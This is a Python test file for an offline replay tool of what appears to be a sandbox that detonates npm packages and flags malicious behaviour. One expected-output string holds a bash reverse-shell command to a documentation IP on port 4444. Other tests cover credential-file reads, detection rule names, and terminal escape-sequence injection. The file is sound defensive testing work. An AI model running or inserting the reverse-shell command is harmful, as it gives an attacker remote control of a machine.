"""`python -m brain.replay`: the offline replay a judge can run without any credentials.

The replay is only worth showing if it is the real thing, so these tests hold it to the same
rule engine and verdict code as the Brain, on the recorded Chamber output, with no network.
"""

import json
import socket
import subprocess
import sys
from pathlib import Path

import pytest

from brain.replay import FIXTURES, RECORDINGS, _main, render, replay

ROOT = Path(__file__).resolve().parents[1]


def run(argv: list[str], capsys) -> tuple[int, str]:
    rc = _main(argv)
    return rc, capsys.readouterr().out


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    """The replay must never reach the network: it exists for people with no keys and no VM."""

    def refuse(*_a, **_k):
        raise AssertionError("brain.replay tried to use the network")

    monkeypatch.setattr(socket, "getaddrinfo", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket.socket, "connect", refuse)


@pytest.mark.parametrize("name", list(RECORDINGS))
def test_every_recording_reproduces_its_verdict(name):
    assert (FIXTURES / f"detonate_real_{name}.json").is_file()
    assert replay(name).final.title == RECORDINGS[name].expected


def test_all_reports_every_recording_and_exits_zero(capsys):
    rc, out = run(["--all"], capsys)
    assert rc == 0
    assert f"{len(RECORDINGS)} of {len(RECORDINGS)} recordings reproduce" in out
    assert "CHANGED" not in out


def test_all_fails_when_a_verdict_changes(monkeypatch, capsys):
    rec = RECORDINGS["re2"]
    monkeypatch.setitem(RECORDINGS, "re2", type(rec)(rec.name, rec.title, "Blocked"))
    rc, out = run(["--all"], capsys)
    assert rc == 1
    assert "CHANGED: expected Blocked" in out


def test_a_finding_prints_directly_under_the_event_that_caused_it(capsys):
    rc, out = run(["dep"], capsys)
    assert rc == 0
    lines = out.splitlines()
    connect = next(i for i, line in enumerate(lines) if "node -> 203.0.113.10:4444" in line)
    assert "no DNS lookup" in lines[connect]
    assert "! NET_RAW_IP (high)" in lines[connect + 1]
    assert "in node_modules/color-helper" in out  # the dependency is named, not the PR author
    assert "Verdict, rules only: Blocked" in out


def test_the_benign_package_stays_clean_and_says_why_muse_is_absent(capsys):
    rc, out = run(["re2"], capsys)
    assert rc == 0
    assert "Rules fired: none" in out
    assert "Verdict, rules only: Clean" in out
    assert "Muse did not run" in out and "never lower" in out


def test_npms_own_read_of_npmrc_is_shown_but_not_flagged(capsys):
    """Shai-Hulud: npm reads ~/.npmrc as config (not a finding); the worm's read is one."""
    _, out = run(["r02"], capsys)
    reads = [line for line in out.splitlines() if "opened /home/runner/.npmrc" in line]
    assert len(reads) == 2
    assert out.count("! CRED_FILE_ACCESS") == 1


def test_exec_lines_name_the_binary_once(capsys):
    _, out = run(["e5"], capsys)
    assert "docker-entrypoint.sh /usr/local/bin/docker-entrypoint.sh" not in out
    assert 'bash -c "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"' in out


def test_untrusted_record_content_cannot_drive_the_terminal(tmp_path):
    """A package can put anything in its argv; an ANSI escape or bidi override must not reach
    the console as a live control sequence."""
    record = json.loads((FIXTURES / "detonate_real_dep.json").read_text(encoding="utf-8"))
    record["exec_events"][-1]["args"] = "install.js \x1b[2J\x1b[31mALL CLEAN‮"
    path = tmp_path / "hostile.json"
    path.write_text(json.dumps(record), encoding="utf-8")
    printed: list[str] = []
    render(replay(str(path)), out=printed.append)
    text = "\n".join(printed)
    assert "\x1b" not in text and "‮" not in text
    assert "\\x1b[2J" in text


def test_a_path_to_any_result_json_works(capsys):
    rc, out = run([str(FIXTURES / "detonate_real_e4.json")], capsys)
    assert rc == 0
    assert "detonate_real_e4.json" in out
    assert "! EXEC_NET_TOOL (high)" in out


def test_unknown_name_is_an_error_that_lists_the_recordings(capsys):
    rc = _main(["nope"])
    err = capsys.readouterr().err
    assert rc == 2
    assert "No recording named 'nope'" in err
    assert all(name in err for name in RECORDINGS)


def test_no_arguments_lists_the_recordings(capsys):
    rc, out = run([], capsys)
    assert rc == 0
    assert all(f"  {name} " in out for name in RECORDINGS)


def test_importing_the_replay_does_not_need_the_modal_sdk():
    """Judges run this without Modal installed or configured."""
    code = "import sys, brain.replay; sys.exit('modal' in sys.modules)"
    done = subprocess.run([sys.executable, "-c", code], cwd=ROOT, capture_output=True)
    assert done.returncode == 0, done.stderr.decode()
